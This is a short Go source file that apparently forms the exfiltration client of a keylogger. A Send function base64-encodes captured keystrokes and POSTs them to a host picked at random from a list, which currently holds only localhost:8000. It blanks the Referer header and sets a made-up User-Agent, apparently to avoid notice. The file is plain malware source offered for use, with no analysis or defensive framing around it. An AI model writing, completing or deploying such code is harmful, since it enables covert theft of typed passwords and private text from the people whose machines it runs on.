package client

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"net/http"
)

const (
	MAX_BUF_SIZE    = 10
	JITTER_BUF_SIZE = 0.3
)

var (
	client = &http.Client{}
	HOSTS  = []string{
		"localhost:8000",
	}
)

type host struct {
	domain string
}

func nextHost() string {
	return fmt.Sprintf("http://%s", HOSTS[rand.Intn(len(HOSTS))])
}

func Send(keystrokes string) {
	fmt.Println(keystrokes)
	buf := &bytes.Buffer{}
	base64.NewEncoder(base64.RawStdEncoding, buf).Write([]byte(keystrokes))
	req, _ := http.NewRequest("POST", nextHost(), buf)
	req.Header.Set("Referer", "")
	req.Header.Set("User-Agent", "FooBar")
	_, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
}
